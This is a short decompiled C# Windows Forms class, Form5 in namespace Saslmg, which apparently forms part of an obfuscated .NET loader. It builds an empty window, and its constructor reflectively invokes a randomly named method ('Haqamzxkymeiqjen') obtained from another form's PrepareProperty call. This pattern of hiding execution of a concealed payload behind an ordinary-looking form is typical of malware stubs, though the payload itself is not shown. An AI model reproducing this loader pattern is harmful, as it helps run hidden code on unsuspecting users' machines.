using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;

namespace Saslmg;

public class Form5 : Form
{
	private IContainer _Candidate = null;

	public Form5()
	{
		ListProperty();
		new Form4().PrepareProperty().GetMethod("Haqamzxkymeiqjen")!.DeclaringType!.InvokeMember("Haqamzxkymeiqjen", BindingFlags.InvokeMethod, null, null, null);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && _Candidate != null)
		{
			_Candidate.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void ListProperty()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(11f, 24f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(651, 409));
		((Control)this).set_Name("Form5");
		((Control)this).set_Text("Form5");
		((Control)this).ResumeLayout(false);
	}
}
